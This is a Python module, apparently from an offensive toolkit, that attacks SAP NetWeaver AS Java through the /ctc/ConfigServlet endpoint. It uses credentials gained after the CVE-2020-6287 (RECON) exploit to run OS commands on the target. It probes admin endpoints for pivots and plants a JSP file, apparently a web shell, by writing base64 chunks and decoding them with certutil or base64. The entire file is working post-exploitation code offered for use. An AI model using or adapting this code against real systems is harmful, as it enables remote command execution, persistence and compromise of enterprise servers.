#!/usr/bin/env python3
"""SAP NetWeaver AS Java — /ctc/ConfigServlet client.

The ``com.sap.ctc.servlet.ConfigServlet`` is an HTTP endpoint shipped
with AS Java's Configuration layer.  It exposes operations from
``com.sap.ctc.util.FileSystemConfig`` that allow an authenticated
administrator to execute OS commands and read/write arbitrary files
on the server.

Pre-SAP-note 1589525 the servlet was reachable unauthenticated
(CVE-2012-2611).  Modern releases require HTTP Basic authentication
against a UME administrator — which is exactly what we have after
CVE-2020-6287 (RECON) lands.

Because the servlet runs on the same HTTP port as the CTCWebService
SOAP endpoint (50000 + inst*100), it is reachable whenever RECON was
reachable — unlike the admin telnet console which is routinely bound
to 127.0.0.1.  This makes CTC the preferred post-RECON deploy path.

The module surface mirrors sap_java_telnet:
    probe(host, port, user, pwd, ...)                      → dict
    execute_cmd(host, port, user, pwd, cmd, ...)           → dict
    deploy_jsp_via_ctc(host, port, user, pwd, bytes, path) → dict
"""

from __future__ import annotations

import base64
import logging
import random
import re
import ssl
import string
import urllib.error
import urllib.parse
import urllib.request
from typing import Optional

logger = logging.getLogger(__name__)

_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko)")
_CTC_PATH = "/ctc/ConfigServlet"
_CONFIG_CLASS = "com.sap.ctc.util.FileSystemConfig"


def _build_url(host: str, port: int, use_https: bool,
                 path: str = _CTC_PATH) -> str:
    scheme = "https" if use_https else "http"
    if ":" in host and not host.startswith("["):
        host = f"[{host}]"
    return f"{scheme}://{host}:{port}{path}"


def _auth_header(user: str, pwd: str) -> str:
    token = base64.b64encode(f"{user}:{pwd}".encode("utf-8")).decode("ascii")
    return f"Basic {token}"


def _http_get(url: str, user: str, pwd: str, timeout: float) -> tuple:
    """GET with HTTP Basic.  Returns (status, body, error)."""
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(url, headers={
        "User-Agent": _UA,
        "Authorization": _auth_header(user, pwd),
    })
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.status, r.read().decode("latin1", errors="replace"), ""
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("latin1", errors="replace")
        except Exception:
            body = ""
        return e.code, body, ""
    except Exception as e:
        return 0, "", str(e)


# ---------------------------------------------------------------------------
# Probes / command execution
# ---------------------------------------------------------------------------

# Alternate paths for the same FileSystemConfig entry point.  Different
# AS-Java releases and hardening profiles ship different subsets.
_CTC_ALT_PATHS = (
    "/ctc/ConfigServlet",
    "/ctc/CTCWebServiceImpl",
    "/CTCWebServiceImpl",
    "/ctc/servlet/ConfigServlet",
    "/ctc/config/ConfigServlet",
)

# Common admin-auth HTTP endpoints, used by the diagnostic probe below
# to help the operator pick a viable pivot when ConfigServlet is gone.
_ADMIN_ENDPOINT_CATALOG = (
    ("/useradmin/",                               "UME Admin UI"),
    ("/nwa/",                                     "NetWeaver Administrator"),
    ("/logviewer/",                               "Log Viewer"),
    ("/monitoring/",                              "Monitoring Servlet"),
    ("/sap/monitoring/SystemInfo",                "SystemInfo"),
    ("/jmx/",                                     "JMX Console"),
    ("/ctc/ConfigServlet",                        "CTC ConfigServlet"),
    ("/ctc/CTCWebServiceImpl",                    "CTC Web Service Impl"),
    ("/CTCWebService/CTCWebServiceBean",          "CTC Web Service (RECON)"),
    ("/webdynpro/resources/sap.com/tc~lm~webadmin~mainframe~wd/MainFrame",
        "LM Web Admin MainFrame"),
    ("/webdynpro/resources/sap.com/tc~lm~ctc~deploy~wd/Main",
        "LM CTC Deploy WD App"),
    ("/webdynpro/dispatcher/sap.com/tc~lm~itsam~ui~mainframe~wd/Shell",
        "NWA Shell WD"),
    ("/XIMonitor/",                               "PI Integration Monitor"),
    ("/mdt/",                                     "Message Directory Tool"),
    ("/rwb/",                                     "Runtime Workbench"),
    ("/bugrep/",                                  "Bug Report Tool"),
    ("/sldc/",                                    "SLD Central"),
)


def discover_ctc_path(host: str, port: int, user: str, pwd: str,
                         use_https: bool = False,
                         timeout: float = 6.0) -> str:
    """Return the first `_CTC_ALT_PATHS` that responds with something
    other than 404 (either authenticated 200 or 401/403), otherwise "".
    """
    ctx = ssl._create_unverified_context()
    for path in _CTC_ALT_PATHS:
        scheme = "https" if use_https else "http"
        url = f"{scheme}://{host}:{port}{path}"
        req = urllib.request.Request(url, headers={
            "User-Agent": _UA,
            "Authorization": _auth_header(user, pwd),
        })
        try:
            with urllib.request.urlopen(req, timeout=timeout,
                                           context=ctx) as r:
                if r.status != 404:
                    return path
        except urllib.error.HTTPError as e:
            if e.code != 404:
                return path
        except Exception:
            continue
    return ""


def probe_admin_endpoints(host: str, port: int, user: str, pwd: str,
                              use_https: bool = False,
                              timeout: float = 4.0) -> list:
    """Diagnostic: HEAD a catalog of common Java admin endpoints with
    HTTP Basic + report which are present.

    Returns a list of dicts: {path, desc, status, marker}
    where marker is one of "OK", "AUTH-REJECTED", "FORBIDDEN", "MISSING",
    or "UNREACHABLE".
    """
    ctx = ssl._create_unverified_context()
    out = []
    scheme = "https" if use_https else "http"
    base = f"{scheme}://{host}:{port}"
    for path, desc in _ADMIN_ENDPOINT_CATALOG:
        req = urllib.request.Request(base + path, method="HEAD",
                                       headers={"User-Agent": _UA,
                                                "Authorization":
                                                _auth_header(user, pwd)})
        try:
            with urllib.request.urlopen(req, timeout=timeout,
                                           context=ctx) as r:
                status = r.status
        except urllib.error.HTTPError as e:
            status = e.code
        except Exception:
            out.append({"path": path, "desc": desc,
                        "status": 0, "marker": "UNREACHABLE"})
            continue
        if status == 404:
            marker = "MISSING"
        elif status in (401,):
            marker = "AUTH-REJECTED"
        elif status in (403,):
            marker = "FORBIDDEN"
        elif status < 400:
            marker = "OK"
        else:
            marker = f"HTTP-{status}"
        out.append({"path": path, "desc": desc,
                    "status": status, "marker": marker})
    return out


def probe(host: str, port: int, user: str, pwd: str,
            use_https: bool = False, timeout: float = 10.0,
            ctc_path: str = _CTC_PATH) -> dict:
    """Check whether the ConfigServlet is present and accepts our creds.

    We run a harmless ``EXECUTE_CMD`` with a no-op command that echoes
    a random token, and look for the token in the response body.
    """
    result = {"reachable": False, "authenticated": False,
              "http_status": 0, "evidence": "",
              "url": _build_url(host, port, use_https, ctc_path)}

    token = "sapmap_" + "".join(random.choice(string.ascii_lowercase)
                                   for _ in range(8))
    cmd = _osexec_wrapper(f"echo {token}", os_type="windows")
    r = execute_cmd(host, port, user, pwd, cmd,
                     use_https=use_https, timeout=timeout, raw=True,
                     ctc_path=ctc_path)
    result["http_status"] = r.get("http_status", 0)

    if r.get("http_status") == 0:
        result["evidence"] = f"network error: {r.get('error', '?')}"
        return result
    result["reachable"] = True
    if r.get("http_status") == 401:
        result["evidence"] = ("HTTP 401 — /ctc/ConfigServlet rejected "
                              "credentials (wrong password or user "
                              "lacks ConfigServlet role)")
        return result
    if r.get("http_status") == 404:
        result["evidence"] = ("HTTP 404 — /ctc/ConfigServlet not "
                              "deployed (module disabled or removed)")
        return result
    result["authenticated"] = True
    if token in (r.get("output") or ""):
        result["evidence"] = (f"OK — EXECUTE_CMD returned our probe "
                              f"token (ConfigServlet operational)")
    else:
        result["evidence"] = (f"HTTP {r.get('http_status')} but probe "
                              f"token not echoed — "
                              f"body: {(r.get('output') or '')[:160]}")
    return result


def execute_cmd(host: str, port: int, user: str, pwd: str,
                  cmd: str, *,
                  use_https: bool = False, timeout: float = 30.0,
                  raw: bool = False,
                  ctc_path: str = _CTC_PATH) -> dict:
    """Run an OS command on the target via FileSystemConfig;EXECUTE_CMD.

    Args:
        cmd: full command line as a single string (for Runtime.exec).
             Use `_osexec_wrapper` or pass an explicit
             ``cmd.exe /C …`` / ``sh -c "…"`` yourself.
        raw: when True, skip the success-marker check and return the
             raw body (used by probe()).
    """
    result = {"success": False, "http_status": 0,
              "output": "", "error": "", "url": ""}

    # The ConfigServlet parses its `param` query like:
    #   com.sap.ctc.util.FileSystemConfig;OPERATION;KEY1=VAL1;KEY2=VAL2
    # CMDLINE values containing ';' would collide with the param
    # separator.  We avoid that by base64-encoding and letting the
    # remote shell decode — see _osexec_wrapper.
    param = (f"{_CONFIG_CLASS};EXECUTE_CMD;"
             f"CMDLINE={urllib.parse.quote(cmd, safe='')}")
    url = (_build_url(host, port, use_https, ctc_path)
           + "?param=" + urllib.parse.quote(param, safe=";=/"))
    result["url"] = url

    status, body, err = _http_get(url, user, pwd, timeout)
    result["http_status"] = status
    result["output"] = body
    if err:
        result["error"] = err
        return result
    if status != 200:
        result["error"] = f"HTTP {status}"
        return result
    # ConfigServlet wraps output in  <pre>…</pre>  or emits status
    # lines like "Success:" / "Error:".  Strip HTML and check.
    if raw:
        result["success"] = True
        return result
    low = body.lower()
    if "error:" in low and "success:" not in low:
        result["error"] = _strip_html(body)[:300]
        return result
    result["success"] = True
    return result


# ---------------------------------------------------------------------------
# Chunked file write via EXECUTE_CMD
# ---------------------------------------------------------------------------

def _osexec_wrapper(cmd: str, os_type: str = "windows") -> str:
    """Wrap a shell command for Runtime.exec on the target OS."""
    if os_type.lower().startswith("win"):
        # cmd.exe /C accepts a single composite string.
        return f'cmd.exe /C {cmd}'
    return f'/bin/sh -c "{cmd}"'


def _strip_html(text: str) -> str:
    return re.sub(r"<[^>]+>", "", text or "").strip()


def deploy_jsp_via_ctc(host: str, port: int, user: str, pwd: str,
                         jsp_bytes: bytes, target_path: str, *,
                         os_type: str = "windows", use_https: bool = False,
                         timeout: float = 60.0, log=print) -> dict:
    """Write a JSP to ``target_path`` on the target by chunk-echoing
    base64 into a temp file, then certutil / base64 -decoding into
    place.  Uses the ConfigServlet EXECUTE_CMD endpoint with HTTP Basic.
    """
    result = {"success": False, "method": "", "bytes_written": 0,
              "error": ""}

    # Step 1 — locate a ConfigServlet-style endpoint.  Primary path
    # /ctc/ConfigServlet is the 2012-era default; newer hardening
    # profiles move or remove it.
    log(f"[*] ctc: discovering ConfigServlet path on "
        f"{host}:{port} (as {user!r}) …")
    found_path = discover_ctc_path(host, port, user, pwd,
                                      use_https=use_https, timeout=6.0)
    if not found_path:
        log(f"[-] ctc: no ConfigServlet path responded "
            f"(tried: {', '.join(_CTC_ALT_PATHS)})")
        # Run the diagnostic probe so the operator can see what's there.
        log(f"[*] ctc: probing other admin endpoints for visibility …")
        for row in probe_admin_endpoints(host, port, user, pwd,
                                             use_https=use_https):
            log(f"[·] ctc: {row['marker']:<14} "
                f"HTTP {row['status']:>3}  {row['path']}  "
                f"({row['desc']})")
        result["error"] = ("no ConfigServlet endpoint present — system "
                            "looks hardened or minimised.  See the "
                            "admin-endpoint probe above to choose a "
                            "manual pivot; /nwa/deploy_and_change is "
                            "the usual fallback when it exists.")
        return result
    log(f"[+] ctc: using endpoint {found_path}")

    # Step 2 — verify the endpoint actually executes EXECUTE_CMD.
    p = probe(host, port, user, pwd, use_https=use_https, timeout=10,
                 ctc_path=found_path)
    if not p.get("authenticated"):
        result["error"] = f"ctc probe failed: {p.get('evidence', '?')}"
        log(f"[-] ctc: {result['error']}")
        return result
    log(f"[+] ctc: {p.get('evidence', 'probe OK')}")

    b64 = base64.b64encode(jsp_bytes).decode("ascii")
    chunks = [b64[i:i + 250] for i in range(0, len(b64), 250)]
    suffix = "".join(random.choice(string.ascii_lowercase) for _ in range(6))

    if os_type.lower().startswith("win"):
        tmp_path = rf"%TEMP%\sapmap_{suffix}.b64"
        def echo(chunk, op):
            return f"cmd.exe /C echo {chunk}{op}{tmp_path}"
        decode = (f'cmd.exe /C certutil.exe -decode {tmp_path} '
                  f'"{target_path}"')
        cleanup = f"cmd.exe /C del /q {tmp_path}"
    else:
        tmp_path = f"/tmp/sapmap_{suffix}.b64"
        def echo(chunk, op):
            return f'/bin/sh -c "echo {chunk} {op} {tmp_path}"'
        decode = f'/bin/sh -c "base64 -d {tmp_path} > {target_path}"'
        cleanup = f'/bin/sh -c "rm -f {tmp_path}"'

    log(f"[*] ctc: writing {len(jsp_bytes)} bytes as {len(chunks)} "
        f"base64 chunks via EXECUTE_CMD → {tmp_path}")

    # Clear any stale tmp
    execute_cmd(host, port, user, pwd, cleanup,
                  use_https=use_https, timeout=timeout,
                  ctc_path=found_path)

    progress_every = max(1, len(chunks) // 5)
    for idx, chunk in enumerate(chunks):
        op = ">" if idx == 0 else ">>"
        r = execute_cmd(host, port, user, pwd, echo(chunk, op),
                          use_https=use_https, timeout=timeout,
                          ctc_path=found_path)
        if not r.get("success"):
            result["error"] = (f"chunk {idx + 1}/{len(chunks)} failed: "
                               f"{r.get('error', '?')}")
            log(f"[-] ctc: {result['error']}")
            return result
        if ((idx + 1) % progress_every == 0) or (idx + 1 == len(chunks)):
            log(f"[*] ctc: chunk {idx + 1}/{len(chunks)} written")

    log(f"[*] ctc: decoding {tmp_path} → {target_path}")
    dec = execute_cmd(host, port, user, pwd, decode,
                        use_https=use_https, timeout=timeout,
                        ctc_path=found_path)
    if not dec.get("success"):
        result["error"] = f"decode step failed: {dec.get('error', '?')}"
        log(f"[-] ctc: {result['error']}")
        return result
    # Run cleanup but don't fail if it errors
    execute_cmd(host, port, user, pwd, cleanup,
                  use_https=use_https, timeout=timeout,
                  ctc_path=found_path)

    result["success"] = True
    result["method"] = f"ctc.EXECUTE_CMD[{found_path}]"
    result["bytes_written"] = len(jsp_bytes)
    log(f"[+] ctc: {len(jsp_bytes)} bytes written to {target_path}")
    return result
